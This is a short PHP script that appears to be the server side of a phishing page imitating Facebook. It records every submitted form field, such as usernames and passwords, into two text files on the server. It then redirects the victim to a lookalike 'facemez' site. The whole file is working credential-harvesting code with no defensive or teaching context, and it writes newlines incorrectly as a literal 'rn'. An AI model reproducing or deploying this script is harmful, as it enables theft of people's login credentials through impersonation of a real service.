<?php
header ('Location:https://facemez.000webhostapp.com/');
$handle = fopen('username.txt', 'a');
foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, '=');
 fwrite($handle, $value,);
 fwrite($handle, 'rn');
}
$handle = fopen('password.txt', 'a');
foreach($_POST as $variable => $password) {
    fwrite($handle, $variable);
    fwrite($handle, '=');
    fwrite($handle, $password,);
    fwrite($handle, 'rn');
}
fwrite($handle, 'rn');
fclose($handle);
exit;
?>